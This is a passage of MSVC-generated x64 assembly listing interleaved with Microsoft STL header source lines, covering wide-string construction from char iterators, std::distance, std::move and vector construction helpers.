; 2297 :                 for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2298 :                     _Buf[_Idx] = value_type();
; 2299 :                 }
; 2300 :             }
; 2301 : #endif // _HAS_CXX20
; 2302 :         }
; 2303 :     };
; 2304 :     _Bxty _Bx;
; 2305 : 
; 2306 :     // invariant: _Myres >= _Mysize, and _Myres >= _Small_string_capacity (after string's construction)
; 2307 :     // neither _Mysize nor _Myres takes account of the extra null terminator
; 2308 :     size_type _Mysize = 0; // current length of string (size)

	mov	QWORD PTR [rcx+16], rax

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

	mov	QWORD PTR [rcx+24], rax
	mov	rax, rcx
	ret	0
??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal, COMDAT

; 4896 :         return _Mypair._Get_first();

	mov	rax, rcx

; 4897 :     }

	ret	0
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty, COMDAT

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

	xorps	xmm0, xmm0
	mov	rax, rcx
	movups	XMMWORD PTR [rcx], xmm0
	ret	0
??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z
_TEXT	SEGMENT
__formal$dead$ = 8
?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size, COMDAT

; 714  :         return static_cast<size_t>(-1) / sizeof(value_type);

	mov	rax, 9223372036854775807		; 7fffffffffffffffH

; 715  :     }

	ret	0
?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1508 :         return *this;

	mov	rax, rcx

; 1509 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@AEB_W@std@@YAAEB_WAEB_W@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEB_W@std@@YAAEB_WAEB_W@Z PROC		; std::forward<wchar_t const &>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@AEB_W@std@@YAAEB_WAEB_W@Z ENDP		; std::forward<wchar_t const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$?0AEBV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@_W@1@@Z
_TEXT	SEGMENT
this$ = 8
__formal$dead$ = 16
_Val1$dead$ = 24
??$?0AEBV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@_W@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> const &>, COMDAT
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2308 :     size_type _Mysize = 0; // current length of string (size)

	xor	eax, eax
	xorps	xmm0, xmm0

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

	movups	XMMWORD PTR [rcx], xmm0

; 2308 :     size_type _Mysize = 0; // current length of string (size)

	mov	QWORD PTR [rcx+16], rax

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

	mov	QWORD PTR [rcx+24], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1501 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

	mov	rax, rcx
	ret	0
??$?0AEBV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@_W@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Adl_verify_range@V?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@V12@@std@@YAXAEBV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@0@0@Z
_TEXT	SEGMENT
_First$dead$ = 8
_Last$dead$ = 16
??$_Adl_verify_range@V?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@V12@@std@@YAXAEBV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@0@0@Z PROC ; std::_Adl_verify_range<std::_String_iterator<std::_String_val<std::_Simple_types<char> > >,std::_String_iterator<std::_String_val<std::_Simple_types<char> > > >, COMDAT

; 1278 :     // check that [_First, _Last) forms an iterator range
; 1279 :     if constexpr (is_pointer_v<_Iter> && is_pointer_v<_Sentinel>) {
; 1280 : #if _ITERATOR_DEBUG_LEVEL != 0
; 1281 :         _STL_VERIFY(_First <= _Last, "transposed pointer range");
; 1282 : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 1283 :     } else if constexpr (_Range_verifiable_v<_Iter, _Sentinel>) {
; 1284 :         _Verify_range(_First, _Last);
; 1285 :     }
; 1286 : }

	ret	0
??$_Adl_verify_range@V?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@V12@@std@@YAXAEBV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@0@0@Z ENDP ; std::_Adl_verify_range<std::_String_iterator<std::_String_val<std::_Simple_types<char> > >,std::_String_iterator<std::_String_val<std::_Simple_types<char> > > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$distance@PEAD@std@@YA_JPEAD0@Z
_TEXT	SEGMENT
_First$ = 8
_Last$ = 16
??$distance@PEAD@std@@YA_JPEAD0@Z PROC			; std::distance<char *>, COMDAT

; 1570 :     if constexpr (_Is_ranges_random_iter_v<_InIt>) {
; 1571 :         return _Last - _First; // assume the iterator will do debug checking

	sub	rdx, rcx
	mov	rax, rdx

; 1572 :     } else {
; 1573 :         _STD _Adl_verify_range(_First, _Last);
; 1574 :         auto _UFirst             = _STD _Get_unwrapped(_First);
; 1575 :         const auto _ULast        = _STD _Get_unwrapped(_Last);
; 1576 :         _Iter_diff_t<_InIt> _Off = 0;
; 1577 :         for (; _UFirst != _ULast; ++_UFirst) {
; 1578 :             ++_Off;
; 1579 :         }
; 1580 : 
; 1581 :         return _Off;
; 1582 :     }
; 1583 : }

	ret	0
??$distance@PEAD@std@@YA_JPEAD0@Z ENDP			; std::distance<char *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$move@AEAPEAD@std@@YA$$QEAPEADAEAPEAD@Z
_TEXT	SEGMENT
_Arg$ = 8
??$move@AEAPEAD@std@@YA$$QEAPEADAEAPEAD@Z PROC		; std::move<char * &>, COMDAT

; 1548 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

	mov	rax, rcx

; 1549 : }

	ret	0
??$move@AEAPEAD@std@@YA$$QEAPEADAEAPEAD@Z ENDP		; std::move<char * &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ??$_Construct_from_iter@PEADPEAD_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXPEADQEAD_K@Z
_TEXT	SEGMENT
this$ = 64
_First$ = 72
_Last$dead$ = 80
_Count$ = 88
??$_Construct_from_iter@PEADPEAD_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXPEADQEAD_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_from_iter<char *,char *,unsigned __int64>, COMDAT

; 2723 :     _CONSTEXPR20 void _Construct_from_iter(_Iter _First, const _Sent _Last, _Size _Count = {}) {

$LN140:
	mov	QWORD PTR [rsp+16], rbx
	mov	QWORD PTR [rsp+24], rbp
	push	rsi
	push	rdi
	push	r14
	sub	rsp, 32					; 00000020H

; 2724 :         // Pre: _Iter models input_iterator or meets the Cpp17InputIterator requirements.
; 2725 :         // Pre: [_First, _Last) is a valid range.
; 2726 :         // Pre: if _Iter models forward_iterator or meets the Cpp17ForwardIterator requirements,
; 2727 :         //      then is_same_v<_Size, size_type> holds.
; 2728 :         // Pre: if is_same_v<_Size, size_type>, _Count is the length of [_First, _Last).
; 2729 :         // Pre: *this is in small mode; the lifetime of the SSO elements has already begun.
; 2730 : 
; 2731 :         auto& _My_data  = _Mypair._Myval2;
; 2732 :         auto& _Al       = _Getal();
; 2733 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);
; 2734 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 2735 : 
; 2736 :         _My_data._Mysize = 0;

	xor	r14d, r14d

; 2737 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rcx+24], 7

; 2738 : 
; 2739 :         if constexpr (is_same_v<_Size, size_type>) {
; 2740 :             if (_Count > max_size()) {

	mov	rbp, 9223372036854775806		; 7ffffffffffffffeH
	mov	QWORD PTR [rcx+16], r14
	mov	rdi, r9
	mov	rbx, rdx
	mov	rsi, rcx
	cmp	r9, rbp
	ja	$LN138@Construct_

; 2742 :             }
; 2743 : 
; 2744 :             if (_Count > _Small_string_capacity) {

	cmp	r9, 7
	jbe	$LN117@Construct_

; 4763 :         const size_type _Masked = _Requested | _Alloc_mask;

	mov	rax, r9
	or	rax, 7
	cmp	rax, rbp

; 4764 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

	jbe	SHORT $LN10@Construct_

; 4765 :             return _Max;

	mov	rax, 9223372036854775807		; 7fffffffffffffffH
	lea	rcx, QWORD PTR [rax+rax]
$LN32@Construct_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rcx, 4096				; 00001000H
	jb	SHORT $LN34@Construct_

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rax, QWORD PTR [rcx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rax, rcx
	jbe	$LN119@Construct_

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rax
	call	??2@YAPEAX_K@Z				; operator new
	mov	rcx, rax

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	$LN44@Construct_

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	add	rax, 39					; 00000027H
	and	rax, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rax-8], rcx

; 222  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

	jmp	SHORT $LN31@Construct_
$LN10@Construct_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 74   :     return _Left < _Right ? _Right : _Left;

	mov	ecx, 10
	mov	rbp, rax
	cmp	rax, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 84   :         if (_Count > _Max_possible) {

	mov	rax, 9223372036854775807		; 7fffffffffffffffH
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 74   :     return _Left < _Right ? _Right : _Left;

	cmovb	rbp, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2616 :         ++_Capacity; // Take null terminator into consideration

	lea	rcx, QWORD PTR [rbp+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 84   :         if (_Count > _Max_possible) {

	cmp	rcx, rax
	ja	SHORT $LN119@Construct_

; 85   :             _Throw_bad_array_new_length(); // multiply overflow
; 86   :         }
; 87   :     }
; 88   : 
; 89   :     return _Count * _Ty_size;

	add	rcx, rcx

; 196  :     if (_Bytes == 0) {

	jne	SHORT $LN32@Construct_

; 197  :         return nullptr;

	mov	rax, r14
	jmp	SHORT $LN31@Construct_
$LN34@Construct_:

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new
$LN31@Construct_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2747 :                 _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

	mov	QWORD PTR [rsi], rax

; 2226 :         value_type* _Result = _Bx._Buf;

	mov	r8, rsi

; 2748 :                 _My_data._Myres = _New_capacity;

	mov	QWORD PTR [rsi+24], rbp

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	rbp, 7

; 2227 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN61@Construct_

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r8, rax
	mov	rcx, rax
	mov	rdx, rdi

; 2748 :                 _My_data._Myres = _New_capacity;

	jmp	SHORT $LL125@Construct_
$LN117@Construct_:
	mov	r8, rsi
$LN61@Construct_:

; 2749 :             }
; 2750 :         }
; 2751 : 
; 2752 :         _Tidy_deallocate_guard<basic_string> _Guard{this};
; 2753 : 
; 2754 :         constexpr bool _Can_construct_by_copy =
; 2755 :             _Is_specialization_v<_Traits, char_traits> && _Is_EcharT<_Elem> && is_same_v<_Size, size_type>;
; 2756 : 
; 2757 :         if constexpr (_Can_construct_by_copy) {
; 2758 :             const auto _Data = _My_data._Myptr();
; 2759 :             _STD _Copy_n_unchecked4(_STD move(_First), _Count, _Data);

	mov	rcx, r8
	mov	rdx, rdi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4671 :     for (; _Count != 0; ++_Dest, (void) ++_First, --_Count) {

	test	rdi, rdi
	je	SHORT $LN69@Construct_
	npad	13
$LL125@Construct_:

; 4672 :         *_Dest = *_First;

	movsx	eax, BYTE PTR [rbx]
	lea	rbx, QWORD PTR [rbx+1]
	mov	WORD PTR [rcx], ax
	lea	rcx, QWORD PTR [rcx+2]
	sub	rdx, 1
	jne	SHORT $LL125@Construct_
$LN69@Construct_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2797 :     }

	mov	rbx, QWORD PTR [rsp+72]
	mov	rbp, QWORD PTR [rsp+80]
	mov	QWORD PTR [rsi+16], rdi
	mov	WORD PTR [r8+rdi*2], r14w
	add	rsp, 32					; 00000020H
	pop	r14
	pop	rdi
	pop	rsi
	ret	0
$LN119@Construct_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN138@Construct_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2741 :                 _Xlen_string(); // result too long

	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
	int	3
$LN44@Construct_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN136@Construct_:
??$_Construct_from_iter@PEADPEAD_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXPEADQEAD_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_from_iter<char *,char *,unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$?0AEBV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@_W@1@@Z
_TEXT	SEGMENT
this$ = 8
__formal$dead$ = 16
_Val1$dead$ = 24
??$?0AEBV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@_W@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> const &>, COMDAT
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 400  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	xor	eax, eax
	mov	QWORD PTR [rcx], rax
	mov	QWORD PTR [rcx+8], rax
	mov	QWORD PTR [rcx+16], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1501 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

	mov	rax, rcx
	ret	0
??$?0AEBV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@_W@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Adl_verify_range@V?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@V12@@std@@YAXAEBV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@0@0@Z
_TEXT	SEGMENT
_First$dead$ = 8
_Last$dead$ = 16
??$_Adl_verify_range@V?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@V12@@std@@YAXAEBV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@0@0@Z PROC ; std::_Adl_verify_range<std::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > >,std::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > > >, COMDAT

; 1278 :     // check that [_First, _Last) forms an iterator range
; 1279 :     if constexpr (is_pointer_v<_Iter> && is_pointer_v<_Sentinel>) {
; 1280 : #if _ITERATOR_DEBUG_LEVEL != 0
; 1281 :         _STL_VERIFY(_First <= _Last, "transposed pointer range");
; 1282 : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 1283 :     } else if constexpr (_Range_verifiable_v<_Iter, _Sentinel>) {
; 1284 :         _Verify_range(_First, _Last);
; 1285 :     }
; 1286 : }

	ret	0
??$_Adl_verify_range@V?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@V12@@std@@YAXAEBV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@0@0@Z ENDP ; std::_Adl_verify_range<std::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > >,std::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$distance@PEA_W@std@@YA_JPEA_W0@Z
_TEXT	SEGMENT
_First$ = 8
_Last$ = 16
??$distance@PEA_W@std@@YA_JPEA_W0@Z PROC		; std::distance<wchar_t *>, COMDAT

; 1570 :     if constexpr (_Is_ranges_random_iter_v<_InIt>) {
; 1571 :         return _Last - _First; // assume the iterator will do debug checking

	sub	rdx, rcx
	sar	rdx, 1
	mov	rax, rdx

; 1572 :     } else {
; 1573 :         _STD _Adl_verify_range(_First, _Last);
; 1574 :         auto _UFirst             = _STD _Get_unwrapped(_First);
; 1575 :         const auto _ULast        = _STD _Get_unwrapped(_Last);
; 1576 :         _Iter_diff_t<_InIt> _Off = 0;
; 1577 :         for (; _UFirst != _ULast; ++_UFirst) {
; 1578 :             ++_Off;
; 1579 :         }
; 1580 : 
; 1581 :         return _Off;
; 1582 :     }
; 1583 : }

	ret	0
??$distance@PEA_W@std@@YA_JPEA_W0@Z ENDP		; std::distance<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$move@AEAPEA_W@std@@YA$$QEAPEA_WAEAPEA_W@Z
_TEXT	SEGMENT
_Arg$ = 8
??$move@AEAPEA_W@std@@YA$$QEAPEA_WAEAPEA_W@Z PROC	; std::move<wchar_t * &>, COMDAT

; 1548 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

	mov	rax, rcx

; 1549 : }

	ret	0
??$move@AEAPEA_W@std@@YA$$QEAPEA_WAEAPEA_W@Z ENDP	; std::move<wchar_t * &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z
_TEXT	SEGMENT
this$ = 80
_Count$ = 88
<_Val_0>$ = 96
<_Val_1>$ = 104
??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Construct_n<wchar_t *,wchar_t *>, COMDAT

; 2060 :     _CONSTEXPR20 void _Construct_n(_CRT_GUARDOVERFLOW const size_type _Count, _Valty&&... _Val) {

$LN109:

; 2061 :         // Dispatches between the three sized constructions.
; 2062 :         // 1-arg -> value-construction, e.g. vector(5)
; 2063 :         // 2-arg -> fill, e.g. vector(5, "meow")
; 2064 :         // 3-arg -> sized range construction, e.g. vector{"Hello", "Fluffy", "World"}
; 2065 :         auto& _Al       = _Getal();
; 2066 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);
